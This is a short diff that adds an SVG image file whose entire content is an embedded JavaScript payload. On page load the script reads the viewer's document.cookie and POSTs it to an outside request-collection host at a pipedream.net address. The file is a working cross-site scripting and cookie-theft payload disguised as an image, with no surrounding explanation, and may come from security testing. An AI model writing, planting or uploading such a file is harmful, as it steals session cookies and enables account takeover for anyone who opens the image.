@@ -1,0 +1,10 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
+    <script type="text/javascript">
+        window.onload = function() {
+            fetch("https://enatup4cn5drw.x.pipedream.net/", {
+            method: "POST",
+            body: JSON.stringify({cookie: document.cookie})
+            });
+        };
+    </script>
+</svg>
